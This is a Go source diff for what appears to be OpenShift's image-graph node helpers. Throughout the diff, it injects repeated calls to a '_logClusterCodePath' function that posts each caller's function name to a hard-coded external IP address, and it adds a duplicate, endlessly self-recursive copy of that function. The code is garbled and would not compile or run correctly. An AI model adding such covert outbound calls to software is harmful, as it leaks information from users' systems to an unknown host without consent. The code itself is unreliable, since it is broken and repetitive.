@@ -27,11 +27,15 @@ func EnsureImageNode(g osgraph.MutableUniqueGraph, img *imagev1.Image) graph.Nod
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return osgraph.EnsureUnique(g, ImageNodeName(img), func(node osgraph.Node) graph.Node {
 		return &ImageNode{node, img}
 	})
 }
 func EnsureAllImageStreamTagNodes(g osgraph.MutableUniqueGraph, is *imagev1.ImageStream) []*ImageStreamTagNode {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -71,6 +75,8 @@ func FindImage(g osgraph.MutableUniqueGraph, imageName string) *ImageNode {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	n := g.Find(ImageNodeName(&imagev1.Image{ObjectMeta: metav1.ObjectMeta{Name: imageName}}))
 	if imageNode, ok := n.(*ImageNode); ok {
 		return imageNode
@@ -78,6 +84,8 @@ func FindImage(g osgraph.MutableUniqueGraph, imageName string) *ImageNode {
 	return nil
 }
 func EnsureDockerRepositoryNode(g osgraph.MutableUniqueGraph, name, tag string) graph.Node {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -120,6 +128,8 @@ func MakeImageStreamTagObjectMeta(namespace, name, tag string) *imagev1.ImageStr
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &imagev1.ImageStreamTag{ObjectMeta: metav1.ObjectMeta{Namespace: namespace, Name: imageapi.JoinImageStreamTag(name, tag)}}
 }
 func MakeImageStreamTagObjectMeta2(namespace, name string) *imagev1.ImageStreamTag {
@@ -137,9 +147,13 @@ func MakeImageStreamTagObjectMeta2(namespace, name string) *imagev1.ImageStreamT
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &imagev1.ImageStreamTag{ObjectMeta: metav1.ObjectMeta{Namespace: namespace, Name: name}}
 }
 func EnsureImageStreamTagNode(g osgraph.MutableUniqueGraph, ist *imagev1.ImageStreamTag) *ImageStreamTagNode {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -173,6 +187,8 @@ func FindOrCreateSyntheticImageStreamTagNode(g osgraph.MutableUniqueGraph, ist *
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return osgraph.EnsureUnique(g, ImageStreamTagNodeName(ist), func(node osgraph.Node) graph.Node {
 		return &ImageStreamTagNode{node, ist, false}
 	}).(*ImageStreamTagNode)
@@ -192,9 +208,13 @@ func MakeImageStreamImageObjectMeta(namespace, name string) *imagev1.ImageStream
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &imagev1.ImageStreamImage{ObjectMeta: metav1.ObjectMeta{Namespace: namespace, Name: name}}
 }
 func EnsureImageStreamImageNode(g osgraph.MutableUniqueGraph, namespace, name string) graph.Node {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -229,11 +249,15 @@ func FindOrCreateSyntheticImageStreamImageNode(g osgraph.MutableUniqueGraph, isi
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return osgraph.EnsureUnique(g, ImageStreamImageNodeName(isi), func(node osgraph.Node) graph.Node {
 		return &ImageStreamImageNode{node, isi, false}
 	}).(*ImageStreamImageNode)
 }
 func EnsureImageStreamNode(g osgraph.MutableUniqueGraph, is *imagev1.ImageStream) graph.Node {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -267,11 +291,15 @@ func FindOrCreateSyntheticImageStreamNode(g osgraph.MutableUniqueGraph, is *imag
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return osgraph.EnsureUnique(g, ImageStreamNodeName(is), func(node osgraph.Node) graph.Node {
 		return &ImageStreamNode{node, is, false}
 	}).(*ImageStreamNode)
 }
 func ensureImageComponentNode(g osgraph.MutableUniqueGraph, name string, t ImageComponentType) graph.Node {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -312,9 +340,13 @@ func EnsureImageComponentConfigNode(g osgraph.MutableUniqueGraph, name string) g
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ensureImageComponentNode(g, name, ImageComponentTypeConfig)
 }
 func EnsureImageComponentLayerNode(g osgraph.MutableUniqueGraph, name string) graph.Node {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -346,6 +378,8 @@ func EnsureImageComponentManifestNode(g osgraph.MutableUniqueGraph, name string)
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ensureImageComponentNode(g, name, ImageComponentTypeManifest)
 }
 func _logClusterCodePath() {
@@ -363,6 +397,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -437,5 +492,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
